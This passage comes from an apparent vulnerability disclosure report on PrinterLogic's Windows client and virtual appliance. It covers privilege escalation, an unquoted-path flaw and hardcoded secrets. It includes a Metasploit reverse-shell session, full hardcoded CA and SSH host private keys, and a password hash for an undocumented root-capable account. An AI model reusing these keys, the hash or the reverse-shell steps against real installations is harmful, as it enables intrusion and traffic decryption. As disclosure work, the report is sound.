 <span style="color: #666666">47</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Downloading OpenSSL source from </span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_SOURCE_URL</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span>
 <span style="color: #666666">48</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OS</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;OSX&quot;</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
 <span style="color: #666666">49</span>     curl <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_SOURCE_URL</span><span style="color: #BB6688; font-weight: bold">}${</span><span style="color: #19177C">_OPENSSL_TAR</span><span style="color: #BB6688; font-weight: bold">}</span> -O
 <span style="color: #666666">50</span>     curl <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_SOURCE_URL</span><span style="color: #BB6688; font-weight: bold">}${</span><span style="color: #19177C">_OPENSSL_FIPS_TAR</span><span style="color: #BB6688; font-weight: bold">}</span> -O
<span style="color: #666666">[</span>...<span style="color: #666666">]</span>
 <span style="color: #666666">69</span> <span style="color: #408080; font-style: italic"># Compile and install fips wrapper, then openssl</span>
 <span style="color: #666666">70</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Configuring and Installing OpenSSL from source&quot;</span>
 <span style="color: #666666">71</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OS</span><span style="color: #BB6688; font-weight: bold">}</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&quot;OSX&quot;</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
 <span style="color: #666666">72</span>     <span style="color: #008000">cd</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_CURRENT</span><span style="color: #BB6688; font-weight: bold">}</span>/<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_FIPS_NAME</span><span style="color: #BB6688; font-weight: bold">}</span> <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">73</span>         <span style="color: #666666">&amp;&amp;</span> chmod +x Configure <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">74</span>         <span style="color: #666666">&amp;&amp;</span> ./Configure darwin64-x86_64-cc <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">75</span>         <span style="color: #666666">&amp;&amp;</span> make <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">76</span>         <span style="color: #666666">&amp;&amp;</span> sudo make install
 <span style="color: #666666">77</span>     <span style="color: #008000">cd</span> <span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_CURRENT</span><span style="color: #BB6688; font-weight: bold">}</span>/<span style="color: #BB6688; font-weight: bold">${</span><span style="color: #19177C">_OPENSSL_NAME</span><span style="color: #BB6688; font-weight: bold">}</span> <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">78</span>         <span style="color: #666666">&amp;&amp;</span> chmod +x Configure <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">79</span>         <span style="color: #666666">&amp;&amp;</span> ./Configure darwin64-x86_64-cc shared fips <span style="color: #BB6622; font-weight: bold">\</span>
 <span style="color: #666666">80</span>         <span style="color: #666666">&amp;&amp;</span> make depend <span style="color: #BB6622; font-weight: bold">\</span>
</pre></div>

<p>This version of OpenSSL is EOL since 2019.</p>
<p>The solution is based on an outdated and unsupported OpenSSL library.</p>
<h2>Vulnerabilities affecting the Windows client</h2>
<h2>Identification of the solution</h2>
<p>The laptop is running Windows 10 and the Printerlogic version is 25.0.0.426.</p>
<p>Only a superficial analysis was performed on Printerlogic since this security assessment was mainly done against the default installation of a Windows 10 laptop and Printerlogic was a small part of this audit.</p>
<p><a id="win-insecure-programs"></a></p>
<h2>Details - Insecure PrinterInstallerClientInterface.exe, PrinterInstallerClient.exe and PrinterInstallClientLauncher.exe</h2>
<p>The laptop uses PrinterLogic to automatically download and configure printer drivers.</p>
<p>The PrinterLogic website is available at https://[redacted].printercloud10.com/:       </p>
<p>This solution is made of different components:</p>
<ul>
<li>A PHP back-end (out of scope),</li>
<li>An extension in the browser (Chrome, Edge, Firefox),</li>
<li>3 Different process are running on the laptop:</li>
<li>
<ul>
<li>PrinterInstallerClientInterface.exe, as <code>DOMAIN\user</code></li>
</ul>
</li>
<li>
<ul>
<li>PrinterInstallerClient.exe, as <code>NT AUTHORITY\SYSTEM</code></li>
</ul>
</li>
<li>
<ul>
<li>PrinterInstallerClientLauncher.exe, as <code>NT AUTHORITY\SYSTEM</code></li>
</ul>
</li>
</ul>
<p>By default, these 3 programs running on the laptop have no security at all:</p>
<ul>
<li>32-bits</li>
<li>No Data Execution Prevention</li>
<li>No Address Space Layout Randomization</li>
<li>No Control Flow Guard</li>
<li>No Stack Protection</li>
</ul>
<p>Here is PrinterInstallerClient.exe running as <code>NT AUTHORITY\SYSTEM</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-programs.png" /></p>
<p>Furthermore, these programs are a mix of outdated technologies:</p>
<ul>
<li>Pascal;</li>
<li>Delphi;</li>
<li>Python 2.</li>
</ul>
<p><a id="win-lpe-01"></a></p>
<h2>Details - Local Privilege Escalation with insecure of C:\Windows\Temp\PPP\Log</h2>
<p>When these 3 programs are analyzed, the logs are written into disk as <code>NT AUTHORITY\SYSTEM</code> into <code>C:\Windows\Temp\PPP\Log\</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-01.png" /></p>
<p><a href="images/2025-vasion-report-0-win-lpe-01-full.png">Click here for full image</a></p>
<p>All the users have full Read/Write access to these files/directories.</p>
<p>Permissions of <code>PrinterInstallerClient.log</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-02.png" /></p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-03.png" /></p>
<p>Writing of logs as <code>NT AUTHORITY\SYSTEM</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-04.png" /></p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-05.png" /></p>
<p>With a symbolic link, it is possible to redirect the writing of logs as <code>NT AUTHORITY\SYSTEM</code> and to overwrite any file in the system to get a Local Privilege Escalation.</p>
<p>The code also contains multiple race conditions that may allow Local Privilege Escalations.</p>
<p>Also, some DLL hijacking vulnerabilities have been identified.</p>
<p>An attacker can get Local Privilege Escalation.</p>
<p><a id="win-lpe-02"></a></p>
<h2>Details - Local Privilege Escalation with insecure use of C:\Users\%USER%\AppData\Local\Temp\</h2>
<p>Another insecure file write has been identified in <code>C:\Users\%USER%\AppData\Local\Temp\</code>. These files are created as <code>NT AUTHORITY\SYSTEM</code> inside a directory under the control of the local user.</p>
<p>With a symbolic link, it is possible to redirect the writing of these files as <code>NT AUTHORITY\SYSTEM</code> and to overwrite any file in the system to get a Local Privilege Escalation:</p>
<p>Multiple files created in <code>C:\Users\%USER%\AppData\Local\Temp</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-06.png" /></p>
<p><img alt="" src="images/2025-vasion-report-0-win-lpe-07.png" /></p>
<p>An attacker can get Local Privilege Escalation.</p>
<p><a id="win-rce-01"></a></p>
<h2>Details - Remote Code Execution (Execution of C:\Program.exe during the installation of a driver)</h2>
<p>When a driver of a printer is installed using PrinterLogic, the <code>PrinterInstallerClient.exe</code> will execute several programs using the PATH <code>C:\Program Files (x86)\Printer Properties Pro\Printer Installer</code>:</p>
<p>Command executed by <code>PrinterInstallerClient.exe</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-rce-01.png" /></p>
<p><a href="images/2025-vasion-report-0-win-rce-01-full.png">Click here for full image</a></p>
<p>Because the path is not quoted, the system will execute <code>C:\Program.exe</code> before executing programs located inside <code>C:\Program Files (x86)\Printer Properties Pro\Printer Installer</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-rce-02.png" /></p>
<p><a href="images/2025-vasion-report-0-win-rce-02-full.png">Click here for full image</a></p>
<p><code>C:\Program.exe</code> executed by <code>PrinterInstallerClient.exe</code>:</p>
<p><img alt="" src="images/2025-vasion-report-0-win-rce-03.png" /></p>
<p>This will allow an attacker to get a Remote Code Execution using Metasploit after placing a rogue program into <code>C:\Program.exe</code>.</p>
<p>Using a Metasploit agent as <code>C:\Program.exe</code>, the attacker will receive a command execution from the network when a printer driver is installed:</p>
<pre><code>msf6 &gt; use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) &gt; set payload windows/shell/reverse_tcp
payload =&gt; windows/shell/reverse_tcp
msf6 exploit(multi/handler) &gt; set LHOST 192.168.100.1
LHOST =&gt; 192.168.100.1
msf6 exploit(multi/handler) &gt; set LPORT 10000
LPORT =&gt; 10000
msf6 exploit(multi/handler) &gt; run

[*] Started reverse TCP handler on 192.168.100.1:10000
[*] Encoded stage with x86/shikata_ga_nai
[*] Sending encoded stage (267 bytes) to 192.168.100.28
[*] Command shell session 1 opened (192.168.100.1:10000 -&gt; 192.168.100.28:65282 ) at 2021-11-26 05:19:14 -0500


Shell Banner:
Microsoft Windows [Version 10.0.19043.1348]
-----


C:\Program Files (x86)\Printer Properties Pro\Printer Installer Client\bin\idp&gt;whoami
whoami
[redacted]

C:\Program Files (x86)\Printer Properties Pro\Printer Installer Client\bin\idp&gt;exit
exit

[*] 192.168.100.28 - Command shell session 1 closed.  Reason: User exit
msf6 exploit(multi/handler) &gt;
</code></pre>
<p>Note that the attacker needs to place a <code>C:\Program.exe</code> file inside the target machine.</p>
<p><a id="win-hardcoded-private-key"></a></p>
<h2>Details - Hardcoded Private key for the PrinterLogic CA and Hardcoded password</h2>
<p>The configuration file of PrinterLogic can be found in <code>C:\Windows\Temp\Data\clientsettings.dat</code>. It is an XML file containing some values:</p>
<p>Content of <code>C:\Windows\Temp\Data\clientsettings.dat</code>:</p>
<p><xmp>
&lt;?xml version="1.0" encoding="utf-8"?&gt;
<result code="1">
  <desc>Successful</desc>
  <account_settings>
    <setting name="serverType">saas</setting>
    <setting name="admin_prot">Any (specified by url)</setting>
    <setting name="app_url">https://[redacted].printercloud10.com</setting>
    <setting name="badge_ad_object"/>
    <setting name="badge_password">SET</setting>
[...]
    <setting name="snmp_3_authentication_key">[redacted]</setting>
    <setting name="snmp_3_authentication_protocol">sha</setting>
    <setting name="snmp_3_context_engineID"/>
    <setting name="snmp_3_context_name">mfpdirect</setting>
    <setting name="snmp_3_enabled">1</setting>
    <setting name="snmp_3_privacy_key">[redacted]</setting>
</xmp></p>
<p>Furthermore it contains a custom CA and its associated private key:</p>
<p><xmp>
    <setting name="caCertificate">-----BEGIN CERTIFICATE-----
MIIF+DCCA+CgAwIBAgIBADANBgkqhkiG9w0BAQ0FADCBlDELMAkGA1UEBhMCVVMx
DTALBgNVBAgMBFV0YWgxEzARBgNVBAcMClN0LiBHZW9yZ2UxFTATBgNVBAoMDFBy
aW50ZXJMb2dpYzEZMBcGA1UECwwQUHJpbnRlckluc3RhbGxlcjEvMC0GA1UEAwwm
UHJpbnRlckluc3RhbGxlciBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMjEwNjA4
MDEwOTExWhcNNDEwNjAzMDEwOTExWjCBlDELMAkGA1UEBhMCVVMxDTALBgNVBAgM
BFV0YWgxEzARBgNVBAcMClN0LiBHZW9yZ2UxFTATBgNVBAoMDFByaW50ZXJMb2dp
YzEZMBcGA1UECwwQUHJpbnRlckluc3RhbGxlcjEvMC0GA1UEAwwmUHJpbnRlcklu
c3RhbGxlciBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwggIiMA0GCSqGSIb3DQEBAQUA
[...]
ocC5e+TosH3ISmcx/Y0rRYzKVOzW77v18ijozAKlG4usf/vPFaZD+72IaTM=
-----END CERTIFICATE-----
</setting>
    <setting name="cac_filter"/>
    <setting name="cac_issuers"/>
    <setting name="cac_subjects"/>
    <setting name="caPrivateKey">-----BEGIN PRIVATE KEY-----
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQCs4uTY7wGVIs14
OPZnEx33WwXg3b5aAEEw6uTiwgutiZojUoAJ7hytkEK7KDOB1TL7/IphKmtJdkix
LgZYiLtRjzejOeQNPNbvROg/TtBADTalWp6d7j3Sr8a6yz0lwbMYgdpmu1M9kxAg
c10PX2tbjcnGfP2LQ5eXofHkkyvGtCaEo9RSs0DOLsIrK9Y6yctz+tKhYca0wPjI
[...]
a6+mSov2DwmlJJ+y5MvYSXhh5kg0xbulg/kr8jWY0hfopQGAHT2eUmlMaS3ZCxIk
FqmTjGpNQnxLd+LS+YEKyjZsfs/5srqTzyVnn+D2TNeWpbinUESX3hQxXsdU5vDr
2lS4nryEiEh2058Cq6Z4zsBtsjNgtAg=
-----END PRIVATE KEY-----
</xmp></p>
<p>It is possible to confirm this private key is the private key of the public CA by checking modulus - they have the same modulus value:</p>
<pre><code>kali% openssl rsa -noout -modulus -in CA.key
Modulus=ACE2E4D8EF019522CD7838F667131DF75B05E0DDBE5A004130EAE4E2C20BAD899A23528009EE1CAD9042BB283381D532FBFC8A612A6B497648B12E065888BB518F37A339E40D3CD6EF44E83F4ED0400D36A55A9E9DEE3DD2AFC6BACB3D25C1B31881DA66BB533D931020735D0F5F6B5B8DC9C67CFD8B439797A1F1E4932BC6B42684A3D452B340CE2EC22B2BD63AC9CB73FAD2A161C6B4C0F8C8AA9D084017C76829EC926AAB58C9545363D6F5BDDC218F7AA82235AAF9486012709B8F6D0BA5AAF3806590D1E667F173EE2E7A68003A17D3B8EA238352B26F69BC03B3B37A312BB3A026AD0B891C8A283CE69AFA8DE9E0A566E9DC4E99EF26E887E7D7F2C786998BB440DD7F8A9009E4F6790F2F51A06ECD03AEA1FC46035B1BA72F43A8DF0EAC662DCB2F22E5E42BED8B04F7AF2D10EE97007499DE30A3A6225D61FB2856D3563D5E7855FFDA3DB8D599D064471F524E01DF2944F7BC70BC454F2F1CDA8CA0D5737A23E6280C25FCCAD5C1C439F5CE01CBE0348DC190508E73506EAF7060129B63661AF1AE2EA2E4F7695B3A66772A501F33FF13A2947600C8425BC1E7F1B3E664C84A9A284ADAA3352F5C0C6A07991800CDD0DA207497673FAFE046522B57F8C20AC3E14B98F25BA07B58650D0F9CEEA234A41CD268E9507E53BDAB9B46FF0DB39875E3C1AA719376AF6C240A8C99D13D8F525F2E7037523F12CB9855AFBB
kali% openssl x509 -noout -modulus -in CA.crt
Modulus=ACE2E4D8EF019522CD7838F667131DF75B05E0DDBE5A004130EAE4E2C20BAD899A23528009EE1CAD9042BB283381D532FBFC8A612A6B497648B12E065888BB518F37A339E40D3CD6EF44E83F4ED0400D36A55A9E9DEE3DD2AFC6BACB3D25C1B31881DA66BB533D931020735D0F5F6B5B8DC9C67CFD8B439797A1F1E4932BC6B42684A3D452B340CE2EC22B2BD63AC9CB73FAD2A161C6B4C0F8C8AA9D084017C76829EC926AAB58C9545363D6F5BDDC218F7AA82235AAF9486012709B8F6D0BA5AAF3806590D1E667F173EE2E7A68003A17D3B8EA238352B26F69BC03B3B37A312BB3A026AD0B891C8A283CE69AFA8DE9E0A566E9DC4E99EF26E887E7D7F2C786998BB440DD7F8A9009E4F6790F2F51A06ECD03AEA1FC46035B1BA72F43A8DF0EAC662DCB2F22E5E42BED8B04F7AF2D10EE97007499DE30A3A6225D61FB2856D3563D5E7855FFDA3DB8D599D064471F524E01DF2944F7BC70BC454F2F1CDA8CA0D5737A23E6280C25FCCAD5C1C439F5CE01CBE0348DC190508E73506EAF7060129B63661AF1AE2EA2E4F7695B3A66772A501F33FF13A2947600C8425BC1E7F1B3E664C84A9A284ADAA3352F5C0C6A07991800CDD0DA207497673FAFE046522B57F8C20AC3E14B98F25BA07B58650D0F9CEEA234A41CD268E9507E53BDAB9B46FF0DB39875E3C1AA719376AF6C240A8C99D13D8F525F2E7037523F12CB9855AFBB
kali%
</code></pre>
<p>Description of the CA:</p>
<pre><code>kali% openssl x509 -in CA.crt -text -noout
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number: 0 (0x0)
        Signature Algorithm: sha512WithRSAEncryption
        Issuer: C = US, ST = Utah, L = St. George, O = PrinterLogic, OU = PrinterInstaller, CN = PrinterInstaller Certificate Authority
        Validity
            Not Before: Jun  8 01:09:11 2021 GMT
            Not After : Jun  3 01:09:11 2041 GMT
        Subject: C = US, ST = Utah, L = St. George, O = PrinterLogic, OU = PrinterInstaller, CN = PrinterInstaller Certificate Authority
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (4096 bit)
                Modulus:
                    00:ac:e2:e4:d8:ef:01:95:22:cd:78:38:f6:67:13:
                    1d:f7:5b:05:e0:dd:be:5a:00:41:30:ea:e4:e2:c2:
                    0b:ad:89:9a:23:52:80:09:ee:1c:ad:90:42:bb:28:
                    33:81:d5:32:fb:fc:8a:61:2a:6b:49:76:48:b1:2e:
                    06:58:88:bb:51:8f:37:a3:39:e4:0d:3c:d6:ef:44:
                    e8:3f:4e:d0:40:0d:36:a5:5a:9e:9d:ee:3d:d2:af:
[...]
                    ff:0d:b3:98:75:e3:c1:aa:71:93:76:af:6c:24:0a:
                    8c:99:d1:3d:8f:52:5f:2e:70:37:52:3f:12:cb:98:
                    55:af:bb
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier: 
                E7:D5:61:DF:25:55:26:00:96:89:09:0C:B1:E2:8F:35:AD:E7:1B:16
            X509v3 Authority Key Identifier: 
                keyid:E7:D5:61:DF:25:55:26:00:96:89:09:0C:B1:E2:8F:35:AD:E7:1B:16

            X509v3 Basic Constraints: 
                CA:TRUE, pathlen:0
    Signature Algorithm: sha512WithRSAEncryption
         33:d4:53:d0:d5:f0:08:45:b9:c3:3c:90:3c:17:da:af:84:74:
</code></pre>
<p>The same parameters can be found in <code>C:\Program Files (x86)\Printer Properties Pro\Printer Installer Client\defaults.ini</code>:</p>
<p>Content of <code>C:\Program Files (x86)\Printer Properties Pro\Printer Installer Client\defaults.ini</code>:</p>
<pre><code>badge_username=SET
caCertificate=-----BEGIN CERTIFICATE-----
MIIF+DCCA+CgAwIBAgIBADANBgkqhkiG9w0BAQ0FADCBlDELMAkGA1UEBhMCVVMx
DTALBgNVBAgMBFV0YWgxEzARBgNVBAcMClN0LiBHZW9yZ2UxFTATBgNVBAoMDFBy
aW50ZXJMb2dpYzEZMBcGA1UECwwQUHJpbnRlckluc3RhbGxlcjEvMC0GA1UEAwwm
UHJpbnRlckluc3RhbGxlciBDZXJ0aWZpY2F0ZSBBdXRob3JpdHkwHhcNMjEwNjA4
MDEwOTExWhcNNDEwNjAzMDEwOTExWjCBlDELMAkGA1UEBhMCVVMxDTALBgNVBAgM
[...]
cac_subjects=
caPrivateKey=-----BEGIN PRIVATE KEY-----
MIIJQwIBADANBgkqhkiG9w0BAQEFAASCCS0wggkpAgEAAoICAQCs4uTY7wGVIs14
OPZnEx33WwXg3b5aAEEw6uTiwgutiZojUoAJ7hytkEK7KDOB1TL7/IphKmtJdkix
LgZYiLtRjzejOeQNPNbvROg/TtBADTalWp6d7j3Sr8a6yz0lwbMYgdpmu1M9kxAg
c10PX2tbjcnGfP2LQ5eXofHkkyvGtCaEo9RSs0DOLsIrK9Y6yctz+tKhYca0wPjI
qp0IQBfHaCnskmqrWMlUU2PW9b3cIY96qCI1qvlIYBJwm49tC6Wq84BlkNHmZ/Fz
[...]
snmp_3_authentication_key=[redacted]
snmp_3_authentication_protocol=sha
snmp_3_context_engineID=
snmp_3_context_name=mfpdirect
snmp_3_enabled=1
snmp_3_privacy_key=[redacted]
snmp_3_privacy_protocol=aes
snmp_3_security_level=noAuthNoPriv
snmp_3_username=SET
snmp_alerts_default_state=1
snmp_alerts_enabled=1
snmp_attempts=5
</code></pre>
<p>The program PrinterLogic may use this CA to transmit data securely.</p>
<p>It may allow an attacker to intercept data.</p>
<h2>Security assessment done in 2022</h2>
<h2>Identification of the solution</h2>
<p>The audited PrinterLogic version is 20.0.1305.</p>
<p>The audited host version is 1.0.730.</p>
<p>This PrinterLogic version has been retrieved from https://docs.printerlogicva.com/1-Printerlogic/Release_Notes/VA_Latest_Builds.htm (OpenBuild 20.0.1305: January 19, 2022).</p>
<p>The update file can be directly retrieved from https://appliance-cdn.printercloud.com/virtual-appliance-services/releases/20.0.1305/20.0.1305.gpg.</p>
<p>The host version has been retrieved from https://docs.printerlogicva.com/1-Printerlogic/Release_Notes/VA_Latest_Host_Builds.htm (Build 1.0.730: December 30th, 2021).</p>
<p>Checksums of the audited versions:</p>
<pre><code>cc52eed590dc79970df01e7099e36e09a75cf453ebbdabd7dca565341c45ae9e  20.0.1305.gpg
7aac6cfee6d3c16978732215dc5fe63729a5c505afef2d91e99eef9b1eced7a7  printerinstaller-1.0.730.ova
</code></pre>
<p>The update file has been decrypted using the hardcoded GPG key <code>45066ADCF538743121004158DD3BA4C62EA82177.key</code> and the extracted Docker instances have been audited.</p>
<p>The solutions use several Docker instances - all the instances have been made up to date, as shown below:</p>
<p>PrinterLogic VA version</p>
<p><img alt="" src="images/2025-vasion-report-1-local-version.png" /></p>
<p>PrinterLogic SaaS version on [redacted].printerlogic10.com</p>
<p><img alt="" src="images/2025-vasion-report-1-saas-version.png" /></p>
<h2>Structure of the report</h2>
<p>There are 2 versions of PrinterLogic:</p>
<ul>
<li>PrinterLogic Virtual Appliance (<code>VA</code>); and</li>
<li>PrinterLogic SaaS.</li>
</ul>
<p>These 2 versions share the same code base. Consequently, a vulnerability found in one version can be found in the other version with a high confidence.</p>
<p>This report lists the vulnerabilities common to the 2 versions and the vulnerabilities specific to the VA version.</p>
<h2>Vulnerabilities affecting PrinterLogic SaaS / PrinterLogic VA</h2>
<p><a id="va-hardcoded-password-ubuntu"></a></p>
<h2>Details - Hardcoded password for the ubuntu user</h2>
<p>The appliance contains an undocumented user (<code>ubuntu</code>) with a hardcoded password:</p>
<p>Content of <code>/etc/shadow</code>:</p>
<pre>
kali# cat etc/shadow
root:!:18987:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
messagebus:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
uuidd:*:18987:0:99999:7:::
ntp:*:18987:0:99999:7:::
sshd:*:18987:0:99999:7:::
statd:*:18987:0:99999:7:::
<font color=red>ubuntu:$6$FGlSuvGG$loUn3.OwRauCaM0ZeaV739iM5NF2jCSqCFjslWkPAmnH1VlSiiHmHgar995hkTm3NwbIDkmR4LSZICLsMGcjt.:18989:0:99999:7:::</font>
alpine-www-data:*:18987:0:99999:7:::
printerlogic:*:18989:0:99999:7:::
network:saglzhyIcp5Ng:19012:0:99999:7:::
kali#
</pre>

<p>This account is not documented. Futhermore, it has root privileges with sudo, without the password being requested:</p>
<p>Content of <code>/etc/shadow</code>:</p>
<pre><code>root@printerlogic:/var/www/efs_storage/.updates# cat /etc/sudoers
[...]
#includedir /etc/sudoers.d
ubuntu        ALL=(ALL)       NOPASSWD: ALL
%printerlogic_ssh ALL=(ALL) NOPASSWD: ALL
root@printerlogic:/var/www/efs_storage/.updates#
</code></pre>
<p>An attacker who knows the password of an undocumented user (<code>ubuntu</code>) will get root access to the appliance using the console. Access using SSH seems to be non-working (<code>PasswordAuthentication</code> set to <code>no</code> and <code>AllowGroups</code> set to <code>printerlogic_ssh</code>).</p>
<p><a id="va-hardcoded-ssh-keys"></a></p>
<h2>Details - Hardcoded SSH server keys</h2>
<p>The private SSH keys are not specific for each installation but are hardcoded, allowing an attacker to decrypt SSH traffic to the appliance:</p>
<p>Private SSH keys:</p>
<pre><code>root@printerlogic:/etc/ssh# ls -latr
total 584
-rw-r--r--  1 root root   1580 Mar  4  2019 ssh_config
-rw-r--r--  1 root root 553122 Mar  4  2019 moduli
-rw-r--r--  1 root root    338 Dec 26 08:57 ssh_import_id
-rw-r--r--  1 root root    399 Dec 26 08:57 ssh_host_rsa_key.pub
-rw-------  1 root root   1675 Dec 26 08:57 ssh_host_rsa_key
-rw-r--r--  1 root root    179 Dec 26 08:57 ssh_host_ecdsa_key.pub
-rw-------  1 root root    227 Dec 26 08:57 ssh_host_ecdsa_key
-rw-r--r--  1 root root     99 Dec 26 08:57 ssh_host_ed25519_key.pub
-rw-------  1 root root    411 Dec 26 08:57 ssh_host_ed25519_key
lrwxrwxrwx  1 root root     29 Dec 28 20:02 sshd_config -&gt; /etc/printercloud/sshd_config
drwxr-xr-x  2 root root   4096 Dec 28 20:02 .
drwxr-xr-x 96 root root   4096 Jan 21 07:15 ..
root@printerlogic:/etc/ssh# cat ssh_host_rsa_key
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAs6TZ/BACNgh025HbJM2TAIRk3d9O4vyDgOabkUvsbEMVvatu
M6DFewzMtlXqBKSrB+IEwqDspjGVZmgLLuT56Kxx5KGduloQgQla4hptG3MoG1u3
eu4vgfWdwdBtgv8V+6gg1Crp4jjEw4XRgUFR1lkoDpHhqrHAwsjmveogoDCGmW9O
/fcQ7wUqVgq8GAFawtoQS2kWIudUmnH1druX+pdUUkdtKwRHtyAJ9287/1woDUvI
iDTm6l8Pc3yntOcV8wxvL6Jcj3/7I7GLYXO4d+Dg6MeTNkPzb7kURT9D4N/T3GHJ
v9mZR2N2B/kzOM2Rr6khG5SRKwcZSSdaDwZHjQIDAQABAoIBAA4OcCARAJtJvhsQ
Jp2SmFYKBfp2Zq3MJF4JrVKJJk6yURkuOMlBYzJlpf7+aflDCT7sqIKyJNI8Pvxs
V7OrpwJVu/Ov0a+rLG9sU/gtKSxkrla1rn2n9X+twFJSBL+jRg0S8r6nPPW+i2bh
Kat7ePPUthWtxIKetf6HycZCc5sVD0woKenbQ1YPAlDvOqQfblLsj0akK4MiS+6u
K7enOVmCX4mcg3XI9jqbp9Bw90blMGcBSR+AeMunHjxv0+itm6mYVyOGWz+C5Pyh
zRGYuHaTP5apZbbHmCsAlPVF/iazxa0A5EmZMIxpw6aB78VlMkhYAHNcdDXbdrVE
NLnps+ECgYEA5u8cXQ96MOwuqZGwCd0wy1qT8sxDJOw78WF6pv9t2RV0kMS8g0pW
Y8WPx2uJyXJrE4hKfT9rXniENdYxekcUBzLWiCOHMaY07pRsLizypR7WDtbD0JMX
KBXH/g/z3Xvi1bkkC7rfjn0kUNImLs4DiUlp1NP+G/xO06AamHoFQ9cCgYEAxySP
WN6nWVr7oFIOPKVYOdLDaNGlopI8aF2aiBW1iIsXITUUC7W5q9pOPfLldibgvaVF
Ln1s3OgTEVl/FD45FMf/jP6nAq5HOukw6TdpApvzv5qNU5ofqt9Lv0BUaidjae4y
GI2wcyWWmwM5V+uKJhN2X0gkQfJuKN5rtUuY4zsCgYALXvy7jFaM8CRADz9mzPBp
IvWj//DScZtmAFHExVEIXmkV88oAgPmOAh1ZSW9IbwzcslpQnn3P8gk4iWp4ReWz
kQpFO9KdXDzA/qfxAh+Uh9csdeDAdW2veJsXZHuyjTYXJf2jYjk9z+Wo4SAmL9i2
utmuNB4QDLVo8Do/BcsakwKBgQCJvC+pN9ZnZxZCfH58U6AB3lRpWxdEqgA97v/C
v8Ee/5Sv0xZaQwZ4ZjVXg3hRj/JBON3wma+B2sHVbiEGz0KLrQiDbF327LM3e7Ho
m/p1Y4fjLfIxsJfWhzrMvKGmCjgoPCdJ9DXmbkkMTd6LgM28KBnnLO5m7lZizfOR
IQhNoQKBgA6ZqrmgOlITCRazjdUMxBEu1+BXA1OuBsQSKTrX/YZxz7CQxWEyCQjE
FKOvT5DC8VebtzEsrdHuTqs4KRJJOLqJyKMCfjaSHNsUnOaS5zHYp/tosx8t9wSp
dMp80kPaKWB3E0s+hnQXh3STSsKzYyOolrLFXjvKkCrrNwgo2q/t
-----END RSA PRIVATE KEY-----
root@printerlogic:/etc/ssh# cat ssh_host_ecdsa_key
-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIMyVpf/MN5oCJyCpnyVRdxECWvqbMKKCiyYlXBwUTnP6oAoGCCqGSM49
AwEHoUQDQgAEI3uUiNK9u9pWjhL0Sq9TU6w0pyuwHrF5aOybhrPecG73htyEZuD2
uLcF/mYPHRJ93eCVoWKaj6DtxhkGcEVKlQ==
-----END EC PRIVATE KEY-----
root@printerlogic:/etc/ssh# cat ssh_host_ed25519_key
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDl9z93z/gIS+6k/vmGS2Cp/tU8MRN8ual0SAL3s4XQcQAAAJjmh/ND5ofz
